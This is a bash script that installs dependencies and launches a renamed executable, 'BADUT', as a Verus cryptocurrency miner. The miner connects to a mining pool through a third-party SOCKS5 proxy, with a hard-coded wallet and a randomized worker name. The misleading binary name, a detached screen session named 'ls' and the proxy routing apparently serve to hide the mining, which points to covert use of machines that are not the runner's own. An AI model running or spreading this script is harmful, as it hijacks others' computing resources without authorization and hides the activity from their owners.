#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x BADUT
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RVXxf8Ci9MP5VmmkPyXjz3GUdzpBvmBJNH
WORKER=$(echo $(shuf -i 1-5 -n 1)-BASENG)
PROXY=socks5://184.179.216.130:4145
./BADUT -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
